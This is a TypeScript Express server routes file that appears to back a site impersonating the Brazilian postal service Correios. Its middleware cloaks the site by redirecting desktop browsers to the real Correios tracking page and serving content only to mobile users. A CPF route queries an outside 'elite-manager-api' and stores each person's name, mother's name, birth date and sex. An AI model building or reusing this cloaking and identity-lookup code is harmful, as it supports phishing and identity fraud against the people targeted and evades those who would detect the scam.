import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertCpfConsultaSchema } from "@shared/schema";
import { z } from "zod";

// Middleware para detectar dispositivos móveis
function mobileOnlyMiddleware(req: Request, res: Response, next: NextFunction) {
  const userAgent = req.get('User-Agent') || '';
  const host = req.get('Host') || '';
  
  // Exceção para preview do Replit e desenvolvimento
  if (host.includes('.replit.dev') || 
      host.includes('.repl.co') ||
      host.includes('localhost') ||
      host.includes('127.0.0.1')) {
    return next(); // Permite acesso em preview/desenvolvimento
  }
  
  // Padrões para detectar dispositivos móveis
  const mobilePatterns = [
    /Android/i,
    /webOS/i,
    /iPhone/i,
    /iPad/i,
    /iPod/i,
    /BlackBerry/i,
    /Windows Phone/i,
    /Mobile/i,
    /Tablet/i
  ];
  
  // Verifica se é um dispositivo móvel
  const isMobile = mobilePatterns.some(pattern => pattern.test(userAgent));
  
  // Headers adicionais para verificação
  const acceptHeader = req.get('Accept') || '';
  const isBrowser = acceptHeader.includes('text/html');
  
  // Se não for móvel e for um browser (não API), redireciona
  if (!isMobile && isBrowser && !req.path.startsWith('/api')) {
    const officialUrl = 'https://rastreamento.correios.com.br/app/index.php';
    
    // Log da tentativa de acesso
    console.log(`[SECURITY] Desktop access blocked from IP: ${req.ip}, Host: ${host}, User-Agent: ${userAgent}`);
    
    return res.redirect(302, officialUrl);
  }
  
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Aplica o middleware de segurança apenas em produção ou quando solicitado
  if (process.env.NODE_ENV === 'production' || process.env.ENABLE_MOBILE_ONLY === 'true') {
    app.use(mobileOnlyMiddleware);
  }
  
  // API Routes (sempre permitidas independente do dispositivo)
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });
  
  app.get('/api/device-check', (req, res) => {
    const userAgent = req.get('User-Agent') || '';
    const mobilePatterns = [
      /Android/i, /webOS/i, /iPhone/i, /iPad/i, /iPod/i, 
      /BlackBerry/i, /Windows Phone/i, /Mobile/i, /Tablet/i
    ];
    
    const isMobile = mobilePatterns.some(pattern => pattern.test(userAgent));
    
    res.json({ 
      isMobile,
      userAgent,
      timestamp: new Date().toISOString()
    });
  });

  // Rota para consultar CPF
  app.post('/api/cpf/consultar', async (req, res) => {
    try {
      const { cpf } = req.body;

      // Validação básica do CPF
      if (!cpf || typeof cpf !== 'string') {
        return res.status(400).json({
          success: false,
          message: 'CPF é obrigatório'
        });
      }

      // Remove formatação do CPF
      const cpfLimpo = cpf.replace(/\D/g, '');

      if (cpfLimpo.length !== 11) {
        return res.status(400).json({
          success: false,
          message: 'CPF deve ter 11 dígitos'
        });
      }

      // Verifica se já existe na nossa base
      const consultaExistente = await storage.getCpfConsulta(cpfLimpo);
      if (consultaExistente) {
        return res.json({
          success: true,
          message: 'Dados encontrados',
          data: consultaExistente
        });
      }

      // Consulta na API externa
      const apiUrl = `https://elite-manager-api-62571bbe8e96.herokuapp.com/api/external/cpf/${cpfLimpo}`;
      const response = await fetch(apiUrl);
      
      if (!response.ok) {
        return res.status(400).json({
          success: false,
          message: 'Erro ao consultar CPF na base de dados'
        });
      }

      const apiData = await response.json();

      if (!apiData.success) {
        return res.status(400).json({
          success: false,
          message: apiData.message || 'CPF não encontrado'
        });
      }

      // Salva na nossa base de dados
      const dadosParaSalvar = {
        cpf: cpfLimpo,
        nome: apiData.data.nome,
        nomeMae: apiData.data.nome_mae,
        dataNascimento: apiData.data.data_nascimento,
        sexo: apiData.data.sexo
      };

      const novaConsulta = await storage.createCpfConsulta(dadosParaSalvar);

      res.json({
        success: true,
        message: 'Consulta realizada com sucesso',
        data: novaConsulta
      });

    } catch (error) {
      console.error('Erro ao consultar CPF:', error);
      res.status(500).json({
        success: false,
        message: 'Erro interno do servidor'
      });
    }
  });

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  const httpServer = createServer(app);

  return httpServer;
}
